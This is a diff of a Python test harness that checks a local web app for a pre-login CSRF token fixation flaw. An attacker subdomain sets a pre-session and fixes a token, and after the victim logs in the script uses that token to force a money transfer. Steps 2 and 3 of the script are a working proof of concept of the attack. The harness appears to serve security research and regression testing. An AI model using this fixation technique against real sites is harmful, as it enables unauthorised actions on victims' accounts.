@@ -1,105 +1,139 @@
 import requests
 from bs4 import BeautifulSoup
-import random, time
+import os, sys, random
 
-PROTOCOL = "http"
-TARGET =   f'{PROTOCOL}://localtest.me/'
-ATTACKER = f'{PROTOCOL}://attack.localtest.me/'
-PRIVATE_KEY = './server/localtest.me.crt'
+from common import get_csrf_token, login, logout, transfer, get_balance, register_default_users
+from common import PROTOCOL, TARGET, ATTACKER, PRIVATE_KEY
+from common import HOMEPAGE_MESSAGE, LOGIN_PAGE, LOGGEDIN_MESSAGE
+from common import CORF_FAIL_WITHOUT_LOGIN, CORF_FAIL_WITH_WRONG_TOKEN, CORF_FAIL_STATUS_CODE, CORF_SUCCESS_MSG
+from common import CORF_PRE_LOGIN_MSG
 
-USER1 = f"{random.randint(10000, 99999)}@a.com"
 NAME1 = f"{random.randint(10000, 99999)}"
-USER2 = f"{random.randint(10000, 99999)}@a.com"
 NAME2 = f"{random.randint(10000, 99999)}"
+AMMOUNT1 = 100
+AMMOUNT2 = 200
 PASSWORD = "ab-cd-ef"
 
-def register(user, name):
-    r = s.get(TARGET + 'register', verify = PRIVATE_KEY)
-    csrf_token = get_csrf_token(r.text)
-    r = s.post(TARGET + 'register', data = {'csrf_test_name' : csrf_token, 'email' : user, 'username' : name, 'password':  PASSWORD, 'password_confirm' : PASSWORD})
-    assert f'Welcome {name}.' in r.text, r.text
-    print("Registered: ", user, name)
-    logout()
 
+EXPECTED_RESULT = "VULNERABLE"
+if "fixed" in sys.argv or "FIXED" in sys.argv:
+    EXPECTED_RESULT = "FIXED"
 
-def get_csrf_token(page):
-    # return BeautifulSoup(page, 'html.parser').find(id="csrf_token").attrs['value']
-    return BeautifulSoup(page, 'html.parser').find("input", {"name" : "csrf_test_name"})['value']
-
-
-def csrf_check(csrf_token):
-    return s.post(TARGET + 'submitForm', data = {'csrf_test_name' : csrf_token})
-
-
-def login(id, name):
-    r = s.get(TARGET + 'login')
-    assert 'Forgot your password?' in r.text
-
-    csrf_token = get_csrf_token(r.text)
-    r = s.post(TARGET + 'login', data = {'csrf_test_name' : csrf_token, 'email' : id, 'password':  PASSWORD})
-
-    ### ignore this until we solve the issue of having 2 cookies
-    # assert f'Currently logged in as {name}!' in r.text, r.text
-
-    return r
-
-
-def logout():
-    r = s.get(TARGET + 'logout')
-    assert '<a href="login">Login!</a>' in r.text
+try:
+    VERSION = os.environ['VERSION']
+except: 
+    VERSION = "UNDEFINED"
 
 
 with requests.Session() as s:
-    register(USER1, NAME1)
-    register(USER2, NAME2)
+    register_default_users(NAME1, NAME2)
 
 
+print(f"[+] Testing version {VERSION} in {PROTOCOL} mode")
+# print(f"[+] Expected result: {EXPECTED_RESULT}\n")
+
+
+### Test correct functionality
 with requests.Session() as s:
-    print("[+] Testing login")
+    print("[+] Step1: Testing correct behaviour")
 
     ### Access main page
     r = s.get(TARGET, verify = PRIVATE_KEY)
-    assert '<a href="login">Login!</a>' in r.text
+    assert HOMEPAGE_MESSAGE in r.text
 
-    ### Check csrf-check functionality
+    ### Fail to perform the CSRF protected action
     csrf_token = get_csrf_token(r.text)
-    r = csrf_check(csrf_token)
-    assert 'No user logged in' in r.text
+    r = transfer(s, NAME2, AMMOUNT1, csrf_token)
+    assert CORF_FAIL_WITHOUT_LOGIN in r.text
 
-    ### Login (any user works. No passwd)
-    r = login(USER1, NAME1)
+    ### Target Login
+    r = login(s, NAME1, NAME1)
 
-    ### Check csrf_check functionality
+    ### Success in performing the CSRF protected action
+    current_balance = get_balance(r.text)
     csrf_token = get_csrf_token(r.text)
-    r = csrf_check(csrf_token)
-    assert f'Form successfully submitted as user {NAME1}' in r.text
+    r = transfer(s, NAME2, AMMOUNT1, csrf_token)
+
+    assert CORF_SUCCESS_MSG % (AMMOUNT1, NAME1, NAME2) in r.text
+    current_balance -= AMMOUNT1
+    r = s.get(TARGET)
+    assert LOGGEDIN_MESSAGE % NAME1 in r.text
+    assert str(current_balance) in r.text
 
     ### Logout
-    logout()
+    logout(s)
 
-    print("  - Checks passed")
+    print("    - Correct behaviour confirmed")
 
 
 with requests.Session() as s:
-    print("[+] Testing pre-login CSRF attack")
+    print("[+] Step2: Testing CORF Token Fixation Attack (pre-login) without setting pre-session")
 
-    ### ATTACKER INIT
+    ### Access main page
+    r_target = s.get(TARGET, verify = PRIVATE_KEY)
+    assert HOMEPAGE_MESSAGE in r_target.text
+
+    ### Target Login
+    r_target = login(s, NAME1, NAME1)
+    assert current_balance == get_balance(r_target.text)
+
+    ### ATTACKER fails to perform the CSRF protected action on behalf of NAME1 WITHOUT pre-fixating the secret
+    ### Notice that attacker is obtaining the token from a different session
+    ### Notice that NAME1 is already logged in
+    with requests.Session() as s1:
+        r_attacker = s1.get(TARGET, verify = PRIVATE_KEY)
+        assert HOMEPAGE_MESSAGE in r_attacker.text
+
+        ### extract csrf_token to use later
+        csrf_token_attacker = get_csrf_token(r_attacker.text)
+        
+    r_attacker = transfer(s, NAME2, AMMOUNT2, csrf_token_attacker)
+
+    assert r_attacker.status_code == CORF_FAIL_STATUS_CODE
+    assert CORF_FAIL_WITH_WRONG_TOKEN in r_attacker.text, r_attacker.text
+
+    ### Logout
+    logout(s)
+
+    print("    - CORF attack failed without setting pre-session")
+
+
+print("[+] Sanity Checks passed")
+
+
+with requests.Session() as s:
+    print("[+] Step3: Testing CORF Token Fixation Attack (pre-login)")
+
+    # r_target = s.get(TARGET, verify = PRIVATE_KEY)
+    # assert HOMEPAGE_MESSAGE in r_target.text
+
+    ### Attacker sets Pre-Session
     s.get(ATTACKER, verify = PRIVATE_KEY)
     r_attacker = s.get(ATTACKER + 'set_pre_session')
-
-    r_target = s.get(TARGET, verify = PRIVATE_KEY)
-    assert '<a href="login">Login!</a>' in r_target.text
-
-    ### TARGET LOGIN
-    r_target = login(USER2, NAME2)
-
-    r_attacker = s.get(ATTACKER + 'remove')
-
-    ### ATTACKER CSRF
+    ### extract csrf_token to use later
     csrf_token_attacker = get_csrf_token(r_attacker.text)
-    r_attacker = csrf_check(csrf_token_attacker)
 
-    assert f'Form successfully submitted as user {NAME2}' in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"
+    ### Target Login
+    r_target = login(s, NAME1, NAME1)
 
-    print("  - Vulnerable to pre-login CSRF attack")
+    ### ATTACKER succeeds in performing CSRF protected action on behalf of USER1
+    r_attacker = s.get(ATTACKER + 'remove')
+    r_attacker = transfer(s, NAME2, AMMOUNT2, csrf_token_attacker)
+    if EXPECTED_RESULT == 'VULNERABLE':
+        assert CORF_SUCCESS_MSG % (AMMOUNT2, NAME1, NAME2) in r_attacker.text, "NOT " + CORF_PRE_LOGIN_MSG
+        current_balance -= AMMOUNT2
+        r = s.get(TARGET, verify = PRIVATE_KEY)
 
+        assert LOGGEDIN_MESSAGE % NAME1 in r.text
+        assert str(current_balance) in r.text
+        print(f"    - {CORF_PRE_LOGIN_MSG}\n")
+    else:
+        assert CORF_FAIL_WITH_WRONG_TOKEN in r_attacker.text, CORF_PRE_LOGIN_MSG
+        r = s.get(TARGET, verify = PRIVATE_KEY)
+
+        assert LOGGEDIN_MESSAGE % NAME1 in r.text
+        assert str(current_balance) in r.text
+        print(f"    - NOT {CORF_PRE_LOGIN_MSG}\n")
+
+    ### Logout
+    logout(s)
